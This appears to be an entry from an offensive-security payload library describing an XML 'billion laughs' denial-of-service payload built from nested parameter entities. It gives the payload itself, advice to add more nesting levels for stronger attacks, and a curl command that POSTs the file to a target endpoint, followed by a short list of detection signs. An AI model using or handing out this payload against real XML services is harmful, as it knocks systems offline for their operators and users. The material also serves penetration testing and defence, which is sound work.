---
id: 01f0db94-e2d8-4f60-a4c8-fda218db9bc4
name: XML-Billion-Laughs-Delayed-Parameter-Entity-Payload
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.313713+00:00'
updated_at: '2023-04-10T20:24:38.357604+00:00'
platforms:
  - Web
tags:
  - xxe
  - dos
  - billion-laughs
  - parameter-entity
validated: true
---

# XML-Billion-Laughs-Delayed-Parameter-Entity-Payload

## Code

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

## Description

This XML payload implements a delayed Billion Laughs attack using parameter entities (%pe_1 to %pe_4) that recursively reference each other with encoded percent signs (&#37;) and HTML comments to postpone expansion until the DOCTYPE is fully processed. When parsed by a vulnerable XML processor, it causes exponential growth in entity declarations, consuming massive resources and leading to denial of service.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static payload with no variables; customize entity depth (e.g., add pe_5) for stronger attacks if needed. | N/A |

## Usage

Save this code as payload.xml and POST it to any endpoint that parses XML input without entity restrictions, such as a web service accepting XML uploads or SOAP requests. Use tools like curl to deliver it: curl -X POST -H "Content-Type: application/xml" --data-binary @payload.xml http://target.com/endpoint. Ideal for testing XXE protections in web applications during penetration testing.

## Detection

- XML parser logs showing recursive entity expansion or DOCTYPE errors.
- Sudden spikes in memory/CPU during parsing (e.g., via monitoring tools like Prometheus).
- WAF alerts for XXE patterns, such as multiple nested %entity; declarations.
- Network inspection revealing compact XML requests causing server hangs.

## Related

- [[procedures/XML-Billion-Laughs-Delayed-Interpretation-DoS]]
- [[techniques/Endpoint Denial of Service|T1499]]
